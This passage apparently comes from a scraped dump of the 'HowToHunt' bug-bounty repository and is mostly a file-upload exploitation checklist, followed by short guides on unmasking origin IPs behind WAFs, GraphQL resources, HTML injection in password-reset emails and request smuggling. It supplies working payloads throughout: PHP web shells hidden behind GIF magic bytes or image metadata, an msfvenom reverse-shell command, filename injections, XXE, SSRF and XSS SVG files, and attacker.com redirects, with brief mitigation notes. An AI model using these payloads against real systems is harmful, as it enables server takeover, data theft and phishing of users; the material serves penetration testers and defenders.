uploaders may disclose internal paths\n- [SQL injection](https://security.stackexchange.com/questions/29014/are-image-uploads-also-vulnerable-to-sql-injection)\n- DoS attack\n- Many More...\n\n**What extension can lead to what if uploaded successfully:**\n\n- Extensions Impact\n    - `ASP`, `ASPX`, `PHP5`, `PHP`, `PHP3`: Webshell, RCE\n    - `SVG`: Stored XSS, SSRF, XXE\n    - `GIF`: Stored XSS, SSRF\n    - `CSV`: CSV injection\n    - `XML`: XXE\n    - `AVI`: LFI, SSRF\n    - `HTML`, `JS` : HTML injection, XSS, Open redirect\n    - `PNG`, `JPEG`: Pixel flood attack (DoS)\n    - `ZIP`: RCE via LFI, DoS\n    - `PDF`, `PPTX`: SSRF, BLIND XXE\n    - `SCF` : RCE\n\n## Types of Validation in File-Upload:\n\nThere several others too but this are the main 5 types others are like File Signature Validation,File Content Validation, File Storage Location which all comes in further protection.\n\n### 1. Client-Side Validation:\n\n- Client side validation is a type of validation which takes place before the inputs are actually\nsent to the server. And it happens on the web browser by JavaScript, VBScript, or HTML5\nattributes. Programmers use this type of validation to provide better user experience by\nresponding quickly at the browser level.\n- For Example `Error only .jpg is allowed`\n\n### 2. File Name Validation:\n\n- File name validation is when the server validate the file that being uploaded by checking\nits extension, this validation happens based on many methods, but two of the most popular\nmethods are Blacklisting File Extensions and Whitelisting File Extensions.\n- Blacklisting File extensions is a type of protection where only a specific extensions are being\nrejected from the server, Such as php, aspx. While Whitelisting File extensions is the exact\nopposite, which is only a few file extensions are allowed to be uploaded to the server, Such as\njpg, jpeg, gif.\n\n### 3. Content-type / MIME-type Validation:\n\n- Content-Type validation is when the server validate the content of the file by checking the\nMIME type of the file, which can be shown in the http request. For example, some image file\nuploads validate the images uploaded by checking if the Content-Type of the file is an image type.\n- For Example: `Content-type: image/png`\n\n### 4. Content-Length Validation:\n\n- Content-Length validation is when the server checks the length of the content of the\nuploaded file and restricts a file size that can’t be exceeded, Although this type of validation is\nnot very popular, But it can be shown on some file uploads.\n- For Example: `Not allow file size greater than 10 bytes`\n\n### 5. Checking the Image Header:\n\n- When image upload only is allowed, most web applications usually validate the image header by using a server-side function such as `getimagesize()` in PHP. When called, this function will return the size of an image. If the file is not a valid image, meaning that the file header is not that of an image, the function will return FALSE. Therefore, several web applications typically check if the function returns TRUE or FALSE and validate the uploaded file using this information.\n- This can be bypassed by using magic numbers\n\n[List of file signatures - Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)\n\n# Testing For File-Upload and Exploiting.\n\n![https://blog.yeswehack.com/wp-content/uploads/mindmap.png.webp](https://blog.yeswehack.com/wp-content/uploads/mindmap.png.webp)\n\n## Base Step\n\n```markdown\n1. Browse the site and find each upload functionality.\n2. Start with basic test by simply uploading a web shell using Weevely\n\t`weevely generate <password> <path>`\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tOR\n\t Use Msfvenom `msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.8 lport=4444 -f raw`\n3. Try the extension bypasses if that fails\n4. Try changing content-type to bypass\n5. Try Magic number bypass \n6. Try Polygot or PNG IDAT chunks bypass\n7. Finally if successful then upload small POC or exploit further.\n```\n\n## Test Case - 1: Blacklisting Bypass.\n\n```markdown\n1. Find the upload request and send it to the repeater\n2. Now start testing which extension for the file is blacklisted, change the `filename=` Parameter\n\nPOST /images/upload/ HTTP/1.1\nHost: target.com\n[...]\n\n---------------------------829348923824\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"dapos.php\"\nContent-Type: application/x-php\n\n3. Try all of this extension \n\n**PHP** → .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc\n**ASP** → asp, .aspx, .cer, .asa\n**Jsp** → .jsp, .jspx, .jsw, .jsv, .jspf\n**Coldfusion** → .cfm, .cfml, .cfc, .dbm\n**Using random capitalization** → .pHp, .pHP5, .PhAr\n\nFind more in PayloadAllThings and https://book.hacktricks.xyz/pentesting-web/file-upload\n\n4. If successful then exploit further, or there might be other type of validation or \n\t check so try other bypass.\n```\n\n## Test Case - 2: Whitelisting Bypass\n\n```markdown\n1. Find the upload request and send it to the repeater\n2. Now start testing which extension for the file is whitelisted, change the `filename=` Parameter\n\nPOST /images/upload/ HTTP/1.1\nHost: target.com\n[...]\n\n---------------------------829348923824\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"dapos.jpg\"\nContent-Type: application/x-php\n\n3. Try all of this extension \n\nfile.jpg.php\nfile.php.jpg\nfile.php.blah123jpg\nfile.php%00.jpg\nfile.php\\x00.jpg this can be done while uploading the file too, name it file.phpD.jpg and change the D (44) in hex to 00.\nfile.php%00\nfile.php%20\nfile.php%0d%0a.jpg\nfile.php.....\nfile.php/\nfile.php.\\\nfile.php#.png\nfile.\n.html\n\n4. If doesn't works then try to bruteforce using intruder which extension are accepted and try again\n5. If successful then exploit further, or there might be other type of validation or \n\t check so try other bypass.\n```\n\n## Test Case - 3: Content-type validation\n\n```markdown\n1. Find the upload request and send it to the repeater\n2. Upload file.php and change the Content-type: application/x-php or Content-Type : application/octet-stream to Content-type: image/png or Content-type: image/gif or Content-type: image/jpg\n\nPOST /images/upload/ HTTP/1.1\nHost: target.com\n[...]\n\n---------------------------829348923824\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"dapos.php\"\nContent-Type: application/x-php\n\n3. If successful then exploit further, or there might be other type of validation or \n\t check so try other bypass.\n```\n\n## Test Case - 4: Content-Length validation\n\n```markdown\n1. Find the upload request and send it to the repeater\n2. Try all three above bypass first, if they doesn't works then see if file size is been\n\t checked. Try all four of this case in combo for more success rate.\n\nPOST /images/upload/ HTTP/1.1\nHost: target.com\n[...]\n\n---------------------------829348923824\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"dapos.php\"\nContent-Type: application/x-php\n\n[...]\n\n3. Try small file payload like \n\n<?=`$_GET[x]`?>   \n<?=‘ls’;   Note : <? work for “short_open_tag=On” in php.ini ( Default=On )\n\n4. Finally the request should look like this. if this worked then try to access this file\n\t For Example: http://example.com/compromised_file.php?x=cat%20%2Fetc%2Fpasswd \n\nPOST /images/upload/ HTTP/1.1\nHost: target.com\n[...]\n\n---------------------------829348923824\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"dapos.php\"\nContent-Type: application/x-php\n\n<?=`$_GET[x]`?>\n\n5. Dont stop here, upload better shell and try to see if you can find something more \n\t critical like DB_.\n```\n\n## Test Case - 5: Content Bypass / Using Magic Bytes\n\n```markdown\n1. Find the upload request and send it to the repeater\n2. Try all Four above bypass first, if they doesn't works then see if file content is been\n\t checked. Try all five of this case in combo for more success rate.\n\nPOST /images/upload/ HTTP/1.1\nHost: target.com\n[...]\n\n---------------------------829348923824\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"dapos.php\"\nContent-Type: application/x-php\n\n[...]\n\n3. Change the Content-Type: application/x-php to Content-Type: image/gif and Add the \n\t text \"GIF89a;\" before you shell-code.\n\nPOST /images/upload/ HTTP/1.1\nHost: target.com\n[...]\n\n---------------------------829348923824\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"dapos.php\"\nContent-Type: image/gif\n\nGIF89a; <?php system($_GET['cmd']); ?>\n\n4. Try more from here https://en.wikipedia.org/wiki/List_of_file_signatures and change \n\t Content-Type: accordingly\n5. If successful upload better Shell and POC, and see how can you increase critically.\n```\n\n## Test Case - 6: Magic Bytes and Metadata Shell\n\n```markdown\n1. Find the upload request and send it to the repeater\n2. Try all above bypass first, if they doesn't works then see if file content is been\n\t checked. Try all six of this case in combo for more success rate.\n\nPOST /images/upload/ HTTP/1.1\nHost: target.com\n[...]\n\n---------------------------829348923824\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"dapos.php\"\nContent-Type: application/x-php\n\n[...]\n\n4. First Bypass Content-Type checks by setting the value of the \n\t Content-Type header to: image/png , text/plain , application/octet-stream\n5. Introduce the shell inside the metadata using tool exiftool.\n\nexiftool -Comment=\"<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();\" img.jpg\n\n6. Now try uploading this modified img.jpg\n7. Exploit further to increase critically.\n```\n\n## Test Case - 7: Uploading Configuration Files\n\n```markdown\n1. Find the upload request and send it to the repeater\n2. Now try to upload .htaccess file if the app is using php server or else\n\t try to upload .config is app is using ASP server\n3. If you can upload a .htaccess, then you can configure several things and \n\t even execute code (configuring that files with extension .htaccess can be executed).\n\t Different .htaccess shells can be found here: https://github.com/wireghoul/htshells\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tOR\n\t If you can upload .config files and use them to execute code. One way to do it \n\t is appending the code at the end of the file inside an HTML comment: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config\n\t More information and techniques to exploit this vulnerability here: https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/\n4. Try to exploit now that server config is changed upload the shell \n\t For example if you uploaded .htaccess file with \n\t AddType application/x-httpd-php .png in content this configuration would instruct \n\t the Apache HTTP Server to execute PNG images as though they were PHP scripts.\n5. Now simply upload our php shell file with extension .png \n6. Done, try to exploit further.\n```\n\n## Test Case - 8: Try Zip Slip Upload\n\n```markdown\n1. Find the upload request and send it to the repeater\n2. Now check if .zip file is allowed to upload \n3. If a site accepts .zip file, upload .php and compress it into .zip and upload it.\n4. Now visit, site.com/path?page=zip://path/file.zip%23rce.php\n\nIf you also try this tool and info here: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Zip%20Slip\n```\n\n## Test Case -9 : Try ImageMagick\n\n```markdown\nCheck Reference : https://hackerone.com/reports/302885 , https://medium.com/@kunal94/imagemagick-gif-coder-vulnerability-leads-to-memory-disclosure-hackerone-e9975a6a560e\n1. Find the upload functionality like profile pic upload.\n2. Git clone https://github.com/neex/gifoeb in you system.\n3. Goto gifoeb directory and run this command.\n\n./gifoeb gen 512x512 dump.gif\n\n   This will create exploitable dump.gif file where 512x512 is pixel dimension and \n\t dump.gif is an gif file.\n\n   You can also try to bypass some checks.\n\n\t a) ./gifoeb gen 1123x987 dump.jpg\n\t b) ./gifoeb gen 1123x987 dump.png\n\t c) ./gifoeb gen 1123x987 dump.bmp\n\t d) ./gifoeb gen 1123x987 dump.tiff\n\t e) ./gifoeb gen 1123x987 dump.tif\n\n\t(It will create the dump files with different extensions. Try with which site works)\n4. After creation of exploitable files, just upload in the profile settings. \n\t using modified Image files.\n5. Server will return different pixel files. Download this file.\n6. Save and recover the pixel files.\n\t \n\tfor p in previews/*; do\n    ./gifoeb recover $p | strings;\n\tdone\n\n7. More details here https://github.com/neex/gifoeb\n\n########################### Another Different method #############################\n\nReference : https://www.exploit-db.com/exploits/39767 , https://hackerone.com/reports/135072\n\n1. Find Upload functionality.\n2. Make a file with .mvg extension and add below code in it.\n\npush graphic-context\nviewbox 0 0 640 480\nfill 'url(http://example.com/)'\npop graphic-context\n\nHere example.com can be your burp collab url or your site were you can receive HTTP request.\n3. Now use below command \n\nconvert ssrf.mvg out.png\n\n4. Upload the image and see if you received http request.\n\nFind ready made and more payloads here: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20Image%20Magik\n```\n\n## Exploitation:\n\n### XSS:\n\n```markdown\nThere are multiple ways to achieve XSS.\n\n1. Set file name filename=\"svg onload=alert(document.domain)>\" , filename=\"58832_300x300.jpg<svg onload=confirm()>\"\n2. Upload using .gif file\n\nGIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;\n\n3. Upload using .svg file\n\n```\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>\n```\n\n```\n<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n\n<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n   <rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\" />\n   <script type=\"text/javascript\">\n      alert(\"HolyBugx XSS\");\n   </script>\n</svg>\n```\n```\n\n### OpenRedirection:\n\n```markdown\nUpload using .svg file\n\n<code>\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<svg\nonload=\"window.location='https://attacker.com'\"\nxmlns=\"http://www.w3.org/2000/svg\">\n<rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\" />\n</svg>\n</code>\n```\n\n### XXE:\n\n```markdown\n1. Upload using .svg file\n```\n<?xml version=\"1.0\" standalone=\"yes\"?>\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]>\n<svg width=\"500px\" height=\"500px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">\n   <text font-size=\"40\" x=\"0\" y=\"16\">&xxe;</text>\n</svg>\n```\n\n```\n<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"300\" version=\"1.1\" height=\"200\">\n    <image xlink:href=\"expect://ls\"></image>\n</svg>\n```\n\n2. Using excel file you can acheive not only XXE, but other vulnerability too.\nhttps://medium.com/@rezaduty/security-issues-in-import-export-functionality-5d8e4b4e9ed3\n```\n\n### SSRF:\n\n```markdown\n1. Abusing the \"Upload from URL\", if this image is going to be saved in some public site, \n\t you could also indicate a URL from [IPlogger](https://iplogger.org/invisible/) and steal information of every visitor.\n\n2. SSRF Through .svg file.\n\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?><svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\"><image height=\"200\" width=\"200\" xlink:href=\"https://attacker.com/picture.jpg\" /></svg>\n```\n\n### Command Injection:\n\n```markdown\n1. Set filename ; sleep 10;\n```\n\n### LFI:\n\n```markdown\n1. Set filename ../../etc/passwd/logo.png\n2. Set filename ../../../logo.png as it might changed the website logo.\n```\n\n### SQL Injection:\n\n```markdown\n1. Set filename 'sleep(10).jpg\n2. Set filename sleep(10)-- -.jpg\n```\n\n### DOS:\n\n```markdown\n1. Pixel flood attack using image, upload this image and Boom!!\nhttps://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/malicious-images/lottapixel.jpg\nhttps://hackerone.com/reports/390#:~:text=By%20loading%20the%20'whole%20image,Photo%20Viewer%20on%20my%20computer.\n\n2. DoS with a large values name: 1234...99.png \n```\n\n**SSTI:**\n\n```python\n\n```\n\n# Mitigation\n\nFile upload functionality is not straightforward to implement securely. Some recommendations to consider in the design of this functionality include:\n\n- Use a server-generated filename if storing uploaded files on disk.\n- Inspect the content of uploaded files, and enforce a whitelist of accepted, non-executable content types. Additionally, enforce a blacklist of common executable formats, to hinder hybrid file attacks.\n- Enforce a whitelist of accepted, non-executable file extensions.\n- If uploaded files are downloaded by users, supply an accurate non-generic Content-Type header, the X-Content-Type-Options: nosniff header, and also a Content-Disposition header that specifies that browsers should handle the file as an attachment.\n- Enforce a size limit on uploaded files (for defense-in-depth, this can be implemented both within application code and in the web server’s configuration).\n- Reject attempts to upload archive formats such as ZIP.\n\n# Mind-Map\n\n![File_Upload_MindMap](https://user-images.githubusercontent.com/33719912/193826710-b6d71979-04f4-42a6-a9c6-7d14784de9d4.png)\n\n\n# Tools And Payload.\n\n[barrracud4/image-upload-exploits](https://github.com/barrracud4/image-upload-exploits)\n\n[almandin/fuxploider](https://github.com/almandin/fuxploider)\n\n[PortSwigger/upload-scanner](https://github.com/PortSwigger/upload-scanner)\n\n# Reference\n\n[Interesting Test Cases of File uploading vulnerabilities](https://akash-venky091.medium.com/interesting-test-cases-of-file-uploading-vulnerabilities-3ad47f9e6149)\n\n[File upload tricks and checklist](https://www.onsecurity.io/blog/file-upload-checklist)\n\n[File Upload Attacks (Part 1) - Global Bug Bounty Platform](https://blog.yeswehack.com/yeswerhackers/exploitation/file-upload-attacks-part-1/)\n\n[Unrestricted File Upload In PHP](https://medium.com/@nyomanpradipta120/unrestricted-file-upload-in-php-b4459eef9698)\n\n[File Upload - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)\n\n[](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)\n\n[Comprehensive Guide on Unrestricted File Upload](https://www.hackingarticles.in/comprehensive-guide-on-unrestricted-file-upload/)\n\n[HolyBugx/HolyTips](https://github.com/HolyBugx/HolyTips/blob/main/Checklist/File%20Upload.md)\n\n[Exploiting file upload vulnerabilities in web applications](https://infosecwriteups.com/web-application-analysis-exploiting-file-upload-vulnerabilities-cf48f79d51e)\n\n[Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)\n\n[Art of Unrestricted File Upload Exploitation](https://bugdisclose.medium.com/art-of-unrestricted-file-upload-exploitation-92ed28796d0)\n\n[File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)\n\n[Encoding Web Shells in PNG IDAT chunks](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)\n\n[Uploading Backdoor For Fun And Profit. (RCE + DB-cred = P1)](https://medium.com/@mohdaltaf163/uploading-backdoor-for-fun-and-profit-rce-db-cred-p1-2cdaa00e2125)\n\n[Unrestricted File Uploading Vulnerability - Secnhack](https://secnhack.in/unrestricted-file-uploading-vulnerability/)\n\n# Tips\n\n```markdown\nWAF bypass Tips by \n@0xInfection\nCase: File Upload (.php blocked)\n\n/?file=xx.php    <- Blocked\n/?file===xx.php  <- Bypassed\n\nThe file got uploaded successfully.\n```\n\n[https://pbs.twimg.com/media/EpkPLYXVgAMLhZa?format=jpg&name=medium](https://pbs.twimg.com/media/EpkPLYXVgAMLhZa?format=jpg&name=medium)\n\n```markdown\nBypass File Upload Filtering\n\nIn image :\n\nexiftool -Comment='<?php echo \"<pre>\"; system($_GET['cmd']); ?>' shell.jpg \n\nmv shell.jpg  shell.php.jpg\n```\n\n[https://pbs.twimg.com/media/Eq9dOoaXUAAEE8n?format=jpg&name=900x900](https://pbs.twimg.com/media/Eq9dOoaXUAAEE8n?format=jpg&name=900x900)\n\n## Author:\n[KathanP19](https://twitter.com/KathanP19)\n", "timestamp": "2025-10-21T22:02:05.170767"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "File_Upload/old_file_upload_bypass.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/File_Upload/old_file_upload_bypass.md", "content": "# Bypassing File Uploads\n\nSuppose you have a limitation that you can only upload in a few formats like PDF, JPEG, JPG, ….But what if you can upload a PHP file by defying the Upload mechnism and validation of file type check. let me tell you if someone can upload a PHP file then its game over for the website as he will upload a php shell and can easily perform an RCE , or Worst will simply gain a reverse shell on the server.\n\n> __How does Bypass work__\n\nWell it depends on which kind of validation the system is using …it is just verfying the extension ?? if its just doing that then it becomes very easy to bypass and upload a PHP file or something malicious. suppose we have to upload a JPG file so the extension must be something.jpg\n\n---\n\n\n### 1. Bypassing Normal extension\nNow what we can do is we can upload a file which looks like this something.php.jpg or somethings.jpg.php.\n### 2. Bypassing the magic Byte validation.\n\nFor this method we use polygots. Polyglots, in a security context, are files that are a valid form of multiple different file types. For example, a GIFAR is both a GIF and a RAR file. There are also files out there that can be both GIF and JS, both PPT and JS, etc.\n\nso while we have to upload a JPEG file type we actaully can upload a PHAR-JPEG file which will appear to be a JPEg file type to the server while validating. the reason is the file PHAR-JPEg file has both the JPEG header and the PHP file also. so while uploading it didn’t get detected and later after processing the PHP file can be used to exploit.\n\nAnd at last Uploading a shell to some random websites for fun is not really cool so don’t ever try untill unless you have the permission to test.\n\n## 3. Path traversal Upload\nupload file with filename as:\n    \n    ../test.png \n    ..%2Ftest.png\n\n-----\n\n\n**How the bypass was possible?**\n\n1. Create a malicious file with an extension that is accepted by the application.\n2. Upload that file and click on send.\n3. Capture the request in any proxy tool, edit the file extension to the malicious extension that you want. In some cases, you might need to change the content type of a file.\n4. Forward the request to the server.\n\n------\n\n**Test PDF upload functionality.**\n\n- [https://github.com/jonaslejon/malicious-pdf](https://github.com/jonaslejon/malicious-pdf)\n\nResources :-\n\n- [File upload Bypass pdf](https://harshitsengar.in/resources/File%20Upload%20Bypass%20.pdf)\n", "timestamp": "2025-10-21T22:02:05.276484"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "FindOriginIP/FindOrigin.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/FindOriginIP/FindOrigin.md", "content": "# Finding Origin IPs Behind WAFs\n\n## Introduction\n\nWeb Application Firewalls (WAFs) like Cloudflare, AWS WAF, and others protect web applications by filtering and monitoring HTTP traffic. However, discovering the origin IP address behind these protective layers can be crucial during security assessments. This guide outlines various techniques to identify origin IPs.\n\n## Identifying the Presence of a WAF\n\nBefore attempting to bypass a WAF, first confirm its presence:\n\n```bash\n# Get the IP address\ndig +short example.com\n\n# Check the organization\ncurl -s https://ipinfo.io/IP | jq -r '.org'\n```\n\n**Common WAF Indicators:**\n- AWS WAF: Look for \"AWSLB\" and \"AWSLBCORS\" cookies\n- Cloudflare: Organization info will indicate Cloudflare, Inc.\n- Other WAFs may have specific signatures or response headers\n\n## Techniques for Origin IP Discovery\n\n### 1. Historical DNS Records\n\nHistorical DNS records often reveal IPs used before WAF implementation:\n\n- **SecurityTrails DNS History**\n  - Visit: https://securitytrails.com/domain/example.com/dns\n  - Export historical A records\n  - Extract IPs:\n    ```bash\n    grep -E -o \"([0-9]{1,3}[\\\\.]){3}[0-9]{1,3}\" dns_history.txt | sort -u > potential_ips.txt\n    ```\n\n- **DNS Dumpster**\n  - Use https://dnsdumpster.com to generate network maps\n  - Look for non-WAF IP addresses in the results\n\n### 2. Subdomain Enumeration\n\nDevelopment or staging environments often lack proper WAF protection:\n\n```bash\n# Find subdomains and their IPs\nsubfinder -silent -d example.com | dnsprobe -silent | awk '{ print $2 }' | sort -u > subdomain_ips.txt\n```\n\nFocus on subdomains like:\n- dev.example.com\n- staging.example.com\n- test.example.com\n- beta.example.com\n\n### 3. SSL Certificate Information\n\nCertificates often reveal all domains and IPs where they're deployed:\n\n- **Censys Method**:\n  1. Search for certificates using your target domain\n  2. Select \"Certificates\" in the input field and search for your domain\n  3. Review each certificate and click \"Explore\" > \"IPv4 Hosts\"\n  4. Collect all associated IPs\n\n- **Shodan Method**:\n  ```\n  # Search by Common Name (CN)\n  ssl.cert.subject.CN:\"example.com\"\n  \n  # Search in all certificate fields (broader)\n  ssl:\"example.com\"\n  ```\n\n  **Note:** Verify results manually as they may include CDN/proxy IPs. SAN (Subject Alternative Name) fields are generally more reliable than CN.\n\n### 4. Direct IP Testing\n\nFor each potential IP, test if it responds to the target hostname:\n\n```bash\n# Test single IP\ncurl -s -k -H \"Host: example.com\" https://POTENTIAL_IP/\n\n# Test multiple IPs\nfor ip in $(cat potential_ips.txt); do\n  org=$(curl -s https://ipinfo.io/$ip | jq -r '.org')\n  title=$(timeout 2 curl -s -k -H \"Host: example.com\" https://$ip/ | pup 'title text{}')\n  echo \"IP: $ip | Title: $title | Org: $org\"\ndone\n```\n\n### 5. Email Headers Analysis\n\nEmails from the target domain often contain internal IP information:\n\n1. Trigger emails from the target (register, password reset, newsletters)\n2. Examine email headers, particularly:\n   - Return-Path\n   - Received\n   - X-Originating-IP\n\n### 6. Specialized Tools\n\nSeveral tools automate origin IP discovery:\n\n- **CloudFail**:\n  ```bash\n  git clone https://github.com/m0rtem/CloudFail.git\n  cd CloudFail\n  pip install -r requirements.txt\n  python3 cloudfail.py -t example.com\n  ```\n\n- **CloudFlair**:\n  ```bash\n  git clone https://github.com/christophetd/CloudFlair\n  cd CloudFlair\n  pip install -r requirements.txt\n  python3 cloudflair.py example.com\n  ```\n\n## Verifying the Origin IP\n\nAfter discovering potential origin IPs, verify them:\n\n1. Compare response content with the WAF-protected site\n2. Look for server fingerprints (headers, error pages)\n3. Check for administrative interfaces or panels not accessible via WAF\n\n## Best Practices\n\n- Combine multiple techniques for better results\n- Document all discovered IPs and their verification status\n- Check IP ranges belonging to the organization\n- Consider timing your requests to avoid rate limiting\n\n## References\n\n- [Navisec: A Pentester's Guide - Unmasking WAFs and Finding the Source](https://delta.navisec.io/a-pentesters-guide-part-5-unmasking-wafs-and-finding-the-source/)\n- [Detectify: Bypassing Cloudflare WAF with the Origin Server IP Address](https://blog.detectify.com/2019/07/31/bypassing-cloudflare-waf-with-the-origin-server-ip-address/)\n\n## Credits\n\n### Original Author\n* [maverickNerd](https://x.com/maverickNerd)\n\n### Contributors\n* [nagarajcruze](https://github.com/nagarajcruze)\n* [www](https://github.com/www)\n\n---\n*Enhanced and reformatted for HowToHunt repository by [remonsec](https://x.com/remonsec)*\n", "timestamp": "2025-10-21T22:02:05.873194"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "GraphQL/GraphQL.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/GraphQL/GraphQL.md", "content": "## Videos\n- GraphQL Video - [InsiderPhd](https://www.youtube.com/watch?v=GlvNwhq-uBg)\n- [REST in Peace: Abusing GraphQL to Attack Underlying Infrastructure - LevelUp 0x05](https://www.youtube.com/watch?v=NPDp7GHmMa0)\n\n## Blogs\n- Exploit GraphQL - [Yeswehack Blog](https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/)\n- Hacking GraphQL - [Part 1](https://infosecwriteups.com/hacking-graphql-for-fun-and-profit-part-1-understanding-graphql-basics-72bb3dd22efa) [Part 2](https://infosecwriteups.com/hacking-graphql-for-fun-and-profit-part-2-methodology-and-examples-5992093bcc24)\n- [That single GraphQL issue that you keep missing](https://blog.doyensec.com/2021/05/20/graphql-csrf.html) by [Doyensec](https://www.doyensec.com/)\n- [Reverse engineer a GraphQL API](https://swizec.com/blog/reverse-engineer-a-graphql-api-to-automate-love-notes-codewithswiz-24)\n- [Exploiting GraphQL](https://blog.assetnote.io/2021/08/29/exploiting-graphql/) by [Assetnote](https://assetnote.io/)\n- [GraphQL Resources Thread](https://twitter.com/holybugx/status/1441460070387261440?s=21) by [HolyBugx](https://twitter.com/HolyBugx)\n- [GraphQL Test Cases](https://anmolksachan.github.io/graphql/)\n\n# Tools\n- [GraphQL Voyager](https://apis.guru/graphql-voyager/)\n- [GraphQL Cheatsheet](https://devhints.io/graphql)\n- [AutoGraphQL](https://graphql-dashboard.herokuapp.com/) -  Demo [Video ](https://www.youtube.com/watch?v=JJmufWfVvyU)\n- [graphw00f](https://github.com/dolevf/graphw00f) - GraphQL Server Engine Fingerprinting utility to learn more about what technology is behind a given GraphQL endpoint\n- [InQL - Introspection GraphQL Scanner](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f) - A security testing tool to facilitate GraphQL technology security auditing efforts\n- [Graphicator is a GraphQL \"scraper\" / extractor](https://github.com/cybervelia/graphicator)\n\n# Labs\n- Damn-Vulnerable-GraphQL-Application - [Github](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application)\n", "timestamp": "2025-10-21T22:02:06.415067"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "HTML_Injection/HTML_Injection_on_password_reset_page.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/HTML_Injection/HTML_Injection_on_password_reset_page.md", "content": "\n## Summary\nPassword reset links are usually addressed to your account name followed by the reset link. Also if the application allows\nyou to have your account name with tags and special characters then you should try this.\n\n### Steps\n\n1. Create your account\n2. Edit your name to `<h1>attacker</h1>` or `\"abc><h1>attacker</h1>` and save it.\n3. Request for a reset password and check your email.\n4. You will notice the `<h1>` tag getting executed\n\n* HTML injection are usually considered as low to medium severity bugs but you can escalate the severity by serving a \nmalicious link by using `<a href>` for eg: `<h1>attacker</h1><a href=\"your-controlled-domain\"Click here</a>`\n\n* You can redirect the user to your malicious domain and serve a fake reset password page to steal credentials \nAlso you can serve a previously found XSS page and steal user cookies etc etc.. The creativity lies on you..\n\n## Author\n[@C1pher15](https://twitter.com/C1pher15)\n", "timestamp": "2025-10-21T22:02:06.957213"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "HTTP_Desync/http_desync.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/HTTP_Desync/http_desync.md", "content": "# HTTP Desync or Request Smuggling:\n- Basics:\n\"HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users. \" -Portswigger  \n\n\n ## Where ?:  \n\n - Any Endpoint might be Vulnerable to HTTP Desync attack.  \n \n - You can Find the Vulnerability on Non-endpoints as well, But impact is always much higher on Sensitive Endpoints ;)\n ---\n ### Step 1:  \n\n * Go To Repeater tab, and try various Timing based payloads to confirm the bug. More Explaination here:  \n\n[Finding the Vulnerability](https://portswigger.net/web-security/request-smuggling/finding)\n\n### Step 2:  \n\n* Once you have successfully discovored the bug, you can chain it with various bugs eg. Account Takeover by stealing session IDs, Cross side Scripting Attacks in User-Agent Header,etc. More Description here:  \n\n[Exploiting the Vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting)  \n\n---\n## Tools:  \n\n1. [defparam`s_smuggler.py](https://github.com/defparam/smuggler)  \n\n`Usage:`  \n* Smuggler.py :\n\n    `cat alive_urls.txt | python3 smuggler.py -m GET/POST #either GET or POST ` \n    \n    OR\n    \n    ` python3 smuggler.py -u https://example.com -m GET/POST  